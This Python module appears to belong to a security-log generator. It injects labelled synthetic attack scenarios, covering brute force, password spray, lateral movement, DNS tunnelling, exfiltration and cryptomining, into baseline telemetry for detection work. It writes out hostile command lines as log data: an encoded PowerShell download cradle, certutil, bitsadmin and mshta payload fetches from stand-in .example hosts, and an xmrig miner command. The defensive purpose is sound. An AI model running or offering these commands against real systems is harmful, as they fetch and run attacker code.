"""Labelled attack scenarios injected into the baseline.

Each scenario emits native records through the same Sink as benign traffic and
returns a ground-truth label. Event IDs are attached after the batches are
written (see run.py), using the same stable-ID function as the normaliser.

Attacker infrastructure uses documentation ranges (RFC 5737) and `.example`
domains so nothing points at real systems.
"""
from __future__ import annotations

import base64
import random
from dataclasses import dataclass, field
from datetime import date, datetime, timedelta

from engine.generator.benign import WIN, Baseline, at
from engine.generator.emitters import Sink
from engine.generator.world import BROWSERS, DOMAIN, World, det_hex

PS = f"{WIN}\\WindowsPowerShell\\v1.0\\powershell.exe"


@dataclass
class Label:
    scenario_id: str
    type: str
    title: str
    techniques: list[str]
    tactics: list[str]
    start: datetime | None = None
    end: datetime | None = None
    users: set[str] = field(default_factory=set)
    hosts: set[str] = field(default_factory=set)
    indicators: dict[str, set[str]] = field(default_factory=lambda: {"ips": set(), "domains": set(), "urls": set(),
                                                                     "hashes": set()})
    params: dict = field(default_factory=dict)

    def touch(self, ts: datetime) -> None:
        self.start = ts if self.start is None or ts < self.start else self.start
        self.end = ts if self.end is None or ts > self.end else self.end

    def to_dict(self) -> dict:
        return {
            "scenario_id": self.scenario_id, "type": self.type, "title": self.title, "techniques": self.techniques,
            "tactics": self.tactics, "start": self.start.isoformat() if self.start else None,
            "end": self.end.isoformat() if self.end else None, "users": sorted(self.users),
            "hosts": sorted(self.hosts), "indicators": {k: sorted(v) for k, v in self.indicators.items()},
            "params": self.params,
        }


class ScenarioContext:
    def __init__(self, world: World, sink: Sink, baseline: Baseline, rng: random.Random, start: date):
        self.world, self.sink, self.baseline, self.rng, self.start = world, sink, baseline, rng, start
        self.victims: dict[str, str] = {}   # scenario_id → user sam (lets scenarios chain)

    def day(self, offset: int) -> date:
        return self.start + timedelta(days=offset)

    def pick_user(self, spec: str | None, admin: bool = False) -> "object":
        if spec and spec.startswith("@"):
            return self.world.user(self.victims[spec[1:]])
        if spec and spec != "auto":
            return self.world.user(spec)
        pool = self.world.admins if admin else [u for u in self.world.humans if not u.is_admin]
        return self.rng.choice(pool)

    def ws_ip(self, host: str, ts: datetime) -> str:
        """Address the workstation holds at ts; boots it (DHCP) if it was not on that day."""
        ip = self.baseline.ws_ip.get((host, ts.date())) or self.baseline.dhcp.held.get(host)
        if ip is None:
            ip = self.baseline.dhcp.boot(self.sink, self.world.hosts[host], ts - timedelta(minutes=5))
        return ip


def _emit(ctx: ScenarioContext, label: Label, entry) -> None:
    label.touch(entry.ts)


# --------------------------------------------------------------------------- scenarios
def brute_force(ctx: ScenarioContext, label: Label, p: dict) -> None:
    user = ctx.pick_user(p.get("target"))
    src, attempts = p.get("src_ip", "203.0.113.66"), int(p.get("attempts", 150))
    host = p.get("host", "WEB01")
    t = at(ctx.day(p["day"]), p["hour"])
    label.users.add(user.sam), label.hosts.add(host.lower()), label.indicators["ips"].add(src)
    for _ in range(attempts):
        _emit(ctx, label, ctx.sink.win_auth(t, 4625, host, user.sam, "S-1-0-0", 3, src, status="0xC000006D",
                                            sub_status="0xC000006A", package="NTLM"))
        _emit(ctx, label, ctx.sink.conn(t, src, ctx.world.hosts[host].static_ip, 443, service="ssl",
                                        orig_bytes=900, resp_bytes=1400, duration=0.3))
        t += timedelta(seconds=ctx.rng.uniform(1, 5))
    if p.get("success", True):
        _emit(ctx, label, ctx.sink.win_auth(t, 4624, host, user.sam, user.sid, 3, src, package="NTLM"))
    ctx.victims[label.scenario_id] = user.sam


def password_spray(ctx: ScenarioContext, label: Label, p: dict) -> None:
    src = p.get("src_ip", "198.51.100.23")
    n = min(int(p.get("users", 30)), len(ctx.world.humans))
    t = at(ctx.day(p["day"]), p["hour"])
    label.indicators["ips"].add(src), label.hosts.add("dc01")
    targets = ctx.rng.sample(ctx.world.humans, n)
    for user in targets:
        _emit(ctx, label, ctx.sink.win_auth(t, 4625, "DC01", user.sam, "S-1-0-0", 3, src, status="0xC000006D",
                                            sub_status="0xC000006A", package="NTLM"))
        label.users.add(user.sam)
        t += timedelta(seconds=ctx.rng.uniform(20, 50))
    lucky = targets[-1]
    _emit(ctx, label, ctx.sink.win_auth(t, 4624, "DC01", lucky.sam, lucky.sid, 3, src, package="NTLM"))
    ctx.victims[label.scenario_id] = lucky.sam


def encoded_powershell(ctx: ScenarioContext, label: Label, p: dict) -> None:
    user = ctx.pick_user(p.get("victim"))
    ws = user.workstation
    t = at(ctx.day(p["day"]), p["hour"])
    ip = ctx.ws_ip(ws, t)
    domain, c2 = p.get("domain", "update-check.badcdn.example"), p.get("c2_ip", "203.0.113.80")
    url = f"http://{domain}/a.ps1"
    script = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
    enc = base64.b64encode(script.encode("utf-16-le")).decode()
    label.users.add(user.sam), label.hosts.add(ws.lower())
    label.indicators["ips"].add(c2), label.indicators["domains"].add(domain), label.indicators["urls"].add(url)
    word = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
    _emit(ctx, label, ctx.sink.process(t, ws, f"{DOMAIN}\\{user.sam}", word,
                                       f'"{word}" /n "C:\\Users\\{user.sam}\\Downloads\\Invoice_8841.docm"',
                                       "C:\\Windows\\explorer.exe"))
    t += timedelta(seconds=4)
    _emit(ctx, label, ctx.sink.process(t, ws, f"{DOMAIN}\\{user.sam}", PS,
                                       f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {enc}", word))
    _emit(ctx, label, ctx.sink.dns(t + timedelta(seconds=1), ip, domain, [c2]))
    _emit(ctx, label, ctx.sink.conn(t + timedelta(seconds=1.2), ip, c2, 80, service="http", orig_bytes=420,
                                    resp_bytes=18_400))
    _emit(ctx, label, ctx.sink.proxy(t + timedelta(seconds=1.2), ip, user.sam, "GET", url, 200, 18_400, c2,
                                     "text/plain", "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) "
                                                   "WindowsPowerShell/5.1.22621.4111"))
    ctx.victims[label.scenario_id] = user.sam


def lolbins(ctx: ScenarioContext, label: Label, p: dict) -> None:
    user = ctx.pick_user(p.get("victim"))
    ws = user.workstation
    t = at(ctx.day(p["day"]), p["hour"])
    ip = ctx.ws_ip(ws, t)
    domain, c2 = p.get("domain", "cdn-static.badcdn.example"), p.get("c2_ip", "203.0.113.81")
    payload_url, hta_url = f"http://{domain}/payload.dat", f"http://{domain}/x.hta"
    label.users.add(user.sam), label.hosts.add(ws.lower())
    label.indicators["ips"].add(c2), label.indicators["domains"].add(domain)
    label.indicators["urls"].update({payload_url, hta_url})
    cmd = f"{WIN}\\cmd.exe"
    u = f"{DOMAIN}\\{user.sam}"
    steps = [
        (f"{WIN}\\certutil.exe", f"certutil.exe -urlcache -split -f {payload_url} C:\\Users\\Public\\p.dat", cmd),
        (f"{WIN}\\rundll32.exe", "rundll32.exe C:\\Users\\Public\\p.dat,DllRegisterServer", cmd),
        (f"{WIN}\\mshta.exe", f"mshta.exe {hta_url}", cmd),
        (f"{WIN}\\bitsadmin.exe", f"bitsadmin /transfer job1 /download /priority high {payload_url} "
                                  f"C:\\Users\\Public\\u.exe", cmd),
    ]
    _emit(ctx, label, ctx.sink.process(t, ws, u, cmd, "cmd.exe /c start /min cmd", "C:\\Windows\\explorer.exe"))
    for image, cmdline, parent in steps:
        t += timedelta(seconds=ctx.rng.uniform(5, 40))
        _emit(ctx, label, ctx.sink.process(t, ws, u, image, cmdline, parent))
        if "http" in cmdline:
            _emit(ctx, label, ctx.sink.dns(t + timedelta(milliseconds=200), ip, domain, [c2]))
            _emit(ctx, label, ctx.sink.conn(t + timedelta(milliseconds=400), ip, c2, 80, service="http",
                                            orig_bytes=380, resp_bytes=ctx.rng.randint(80_000, 400_000)))
            ua = "Microsoft-CryptoAPI/10.0" if "certutil" in cmdline else "Microsoft BITS/7.8"
            _emit(ctx, label, ctx.sink.proxy(t + timedelta(milliseconds=400), ip, user.sam, "GET",
                                             "http://" + cmdline.split("http://", 1)[1].split(" ", 1)[0],
                                             200, 120_000, c2, "application/octet-stream", ua))
    ctx.victims[label.scenario_id] = user.sam


def lateral_movement(ctx: ScenarioContext, label: Label, p: dict) -> None:
    user = ctx.pick_user(p.get("actor"), admin=True)
    src_host = ctx.world.user(user.sam).workstation if not p.get("from_host") else p["from_host"]
    t = at(ctx.day(p["day"]), p["hour"])
    ip = ctx.ws_ip(src_host, t)
    targets = p.get("targets", ["SQL01", "APP01", "FS01", "DC02"])
    label.users.add(user.sam), label.hosts.update({src_host.lower(), *(x.lower() for x in targets)})
    for host in targets:
        dst = ctx.world.hosts[host].static_ip
        _emit(ctx, label, ctx.sink.win_auth(t, 4624, host, user.sam, user.sid, 3, ip, package="NTLM"))
        _emit(ctx, label, ctx.sink.win_auth(t + timedelta(milliseconds=30), 4672, host, user.sam, user.sid))
        _emit(ctx, label, ctx.sink.conn(t, ip, dst, 445, service="smb", orig_bytes=380_000, resp_bytes=12_000,
                                        duration=8))
        _emit(ctx, label, ctx.sink.process(t + timedelta(seconds=3), host, "NT AUTHORITY\\SYSTEM",
                                           "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe",
                                           f"{WIN}\\services.exe", integrity="System"))
        _emit(ctx, label, ctx.sink.process(t + timedelta(seconds=5), host, f"{DOMAIN}\\{user.sam}", f"{WIN}\\cmd.exe",
                                           "cmd.exe /c whoami /all & net group \"Domain Admins\" /domain",
                                           "C:\\Windows\\PSEXESVC.exe"))
        t += timedelta(minutes=ctx.rng.uniform(3, 12))
    label.indicators["hashes"].add(det_hex("sha256", "c:\\windows\\psexesvc.exe"))
    ctx.victims[label.scenario_id] = user.sam


def privilege_escalation(ctx: ScenarioContext, label: Label, p: dict) -> None:
    actor = ctx.pick_user(p.get("actor"), admin=True)
    member = ctx.pick_user(p.get("member"))
    t = at(ctx.day(p["day"]), p["hour"])
    group = p.get("group", "Domain Admins")
    label.users.update({actor.sam, member.sam}), label.hosts.add("dc01")
    _emit(ctx, label, ctx.sink.win_auth(t, 4728, "DC01", None, None, extra={
        "SubjectUserName": actor.sam, "SubjectDomainName": DOMAIN, "SubjectUserSid": actor.sid,
        "TargetUserName": group, "TargetDomainName": DOMAIN, "TargetSid": "S-1-5-21-3623811015-3361044348-30300820-512",
        "MemberName": f"CN={member.display},OU=Staff,DC=corp,DC=local", "MemberSid": member.sid}))
    ip = ctx.ws_ip(member.workstation, t + timedelta(minutes=10))
    for host in ("DC01", "FS01"):
        t += timedelta(minutes=ctx.rng.uniform(5, 15))
        _emit(ctx, label, ctx.sink.win_auth(t, 4624, host, member.sam, member.sid, 3, ip))
        _emit(ctx, label, ctx.sink.win_auth(t + timedelta(milliseconds=20), 4672, host, member.sam, member.sid))
    ctx.victims[label.scenario_id] = member.sam


def dns_tunnelling(ctx: ScenarioContext, label: Label, p: dict) -> None:
    user = ctx.pick_user(p.get("victim"))
    ws = user.workstation
    t = at(ctx.day(p["day"]), p["hour"])
    ip = ctx.ws_ip(ws, t)
    zone = p.get("domain", "t.exfil-dns.example")
    label.users.add(user.sam), label.hosts.add(ws.lower()), label.indicators["domains"].add(zone)
    alphabet = "abcdefghijklmnopqrstuvwxyz234567"
    for _ in range(int(p.get("queries", 400))):
        sub = "".join(ctx.rng.choice(alphabet) for _ in range(ctx.rng.randint(40, 60)))
        chunk = f"{sub[:30]}.{sub[30:]}"
        rcode = "NOERROR" if ctx.rng.random() < 0.85 else "NXDOMAIN"
        _emit(ctx, label, ctx.sink.dns(t, ip, f"{chunk}.{zone}", None, qtype="TXT", rcode=rcode))
        t += timedelta(seconds=ctx.rng.uniform(2, 12))
    ctx.victims[label.scenario_id] = user.sam


def exfiltration_burst(ctx: ScenarioContext, label: Label, p: dict) -> None:
    user = ctx.pick_user(p.get("victim"))
    ws = user.workstation
    t = at(ctx.day(p["day"]), p["hour"])
    ip = ctx.ws_ip(ws, t)
    dst, domain = p.get("dst_ip", "203.0.113.200"), p.get("domain", "files-share.example")
    url = f"https://{domain}/upload"
    label.users.add(user.sam), label.hosts.add(ws.lower())
    label.indicators["ips"].add(dst), label.indicators["domains"].add(domain), label.indicators["urls"].add(url)
    total = int(p.get("total_mb", 2000)) * 1024 * 1024
    sent, ua = 0, BROWSERS["chrome"][1]
    _emit(ctx, label, ctx.sink.dns(t - timedelta(seconds=1), ip, domain, [dst]))
    while sent < total:
        chunk = ctx.rng.randint(40, 160) * 1024 * 1024
        _emit(ctx, label, ctx.sink.conn(t, ip, dst, 443, service="ssl", orig_bytes=chunk, resp_bytes=8_000,
                                        duration=ctx.rng.uniform(30, 90)))
        _emit(ctx, label, ctx.sink.proxy(t, ip, user.sam, "POST", url, 200, 512, dst, "application/json", ua,
                                         bytes_req=chunk, elapsed_ms=ctx.rng.randint(30_000, 90_000)))
        sent += chunk
        t += timedelta(seconds=ctx.rng.uniform(40, 100))
    # The workstation agent sees the egress spike too.
    m = at(ctx.day(p["day"]), p["hour"]).replace(minute=0)
    while m < t:
        _emit(ctx, label, ctx.sink.metric(m, ws, ctx.rng.uniform(20, 45), ctx.rng.uniform(50, 70),
                                          ctx.rng.randint(10**5, 10**6), total // 3, 600))
        m += timedelta(minutes=10)
    ctx.victims[label.scenario_id] = user.sam


def cryptomining(ctx: ScenarioContext, label: Label, p: dict) -> None:
    host = p.get("host", "APP01")
    t0 = at(ctx.day(p["day"]), p["hour"])
    hours = float(p.get("hours", 30))
    pool, pool_ip = p.get("pool", "pool.minexmr-mirror.example"), p.get("pool_ip", "198.51.100.77")
    src_ip = ctx.world.hosts[host].static_ip or ctx.ws_ip(host, t0)
    image = "C:\\ProgramData\\sysupd\\xmrig.exe"
    label.hosts.add(host.lower()), label.users.add("system")
    label.indicators["ips"].add(pool_ip), label.indicators["domains"].add(pool)
    label.indicators["hashes"].add(det_hex("sha256", image.lower()))
    _emit(ctx, label, ctx.sink.process(t0, host, "NT AUTHORITY\\SYSTEM", image,
                                       f"{image} -o stratum+tcp://{pool}:3333 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLY"
                                       f"fpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge -p x "
                                       f"--donate-level 1 --background", f"{WIN}\\svchost.exe", integrity="System"))
    _emit(ctx, label, ctx.sink.dns(t0 + timedelta(seconds=2), src_ip, pool, [pool_ip]))
    t = t0
    end = t0 + timedelta(hours=hours)
    while t < end:
        _emit(ctx, label, ctx.sink.conn(t, src_ip, pool_ip, 3333, orig_bytes=ctx.rng.randint(20_000, 60_000),
                                        resp_bytes=ctx.rng.randint(20_000, 60_000), duration=3600))
        t += timedelta(hours=1)
    m = t0.replace(minute=(t0.minute // 10) * 10, second=0, microsecond=0) + timedelta(minutes=5)
    while m < end:
        _emit(ctx, label, ctx.sink.metric(m, host, ctx.rng.uniform(92, 99.5), ctx.rng.uniform(55, 70),
                                          ctx.rng.randint(10**6, 10**7), ctx.rng.randint(10**6, 10**7), 600))
        m += timedelta(minutes=10)


SCENARIOS = {
    "brute_force": (brute_force, "Brute force against an exposed host", ["T1110.001"], ["credential-access"]),
    "password_spray": (password_spray, "Password spray across many accounts", ["T1110.003"], ["credential-access"]),
    "encoded_powershell": (encoded_powershell, "Macro launches encoded PowerShell download cradle",
                           ["T1059.001", "T1027", "T1566.001"], ["execution", "defense-evasion", "initial-access"]),
    "lolbins": (lolbins, "Living-off-the-land binaries fetch and run a payload",
                ["T1105", "T1218.011", "T1218.005", "T1197"], ["command-and-control", "defense-evasion"]),
    "lateral_movement": (lateral_movement, "PsExec-style lateral movement to new servers",
                         ["T1021.002", "T1569.002"], ["lateral-movement", "execution"]),
    "privilege_escalation": (privilege_escalation, "User added to Domain Admins", ["T1098", "T1078.002"],
                             ["persistence", "privilege-escalation"]),
    "dns_tunnelling": (dns_tunnelling, "Data tunnelled over DNS TXT queries", ["T1071.004", "T1048.003"],
                       ["command-and-control", "exfiltration"]),
    "exfiltration_burst": (exfiltration_burst, "Night-time bulk upload to an external host",
                           ["T1048", "T1567.002"], ["exfiltration"]),
    "cryptomining": (cryptomining, "Cryptominer on a server (CPU spike + pool traffic)", ["T1496"], ["impact"]),
}


def run_scenarios(ctx: ScenarioContext, definitions: list[dict], days: int) -> list[Label]:
    labels = []
    for d in definitions:
        if not d.get("enabled", True):
            continue
        params = dict(d.get("params", {}))
        params.setdefault("day", d.get("day", 1))
        params.setdefault("hour", d.get("hour", 10.0))
        if params["day"] >= days:
            continue  # scenario falls outside the generated window
        fn, title, techniques, tactics = SCENARIOS[d["type"]]
        label = Label(scenario_id=d["id"], type=d["type"], title=d.get("title", title), techniques=techniques,
                      tactics=tactics, params=params)
        ctx.sink.scenario = label.scenario_id
        try:
            fn(ctx, label, params)
        finally:
            ctx.sink.scenario = None
        labels.append(label)
    return labels
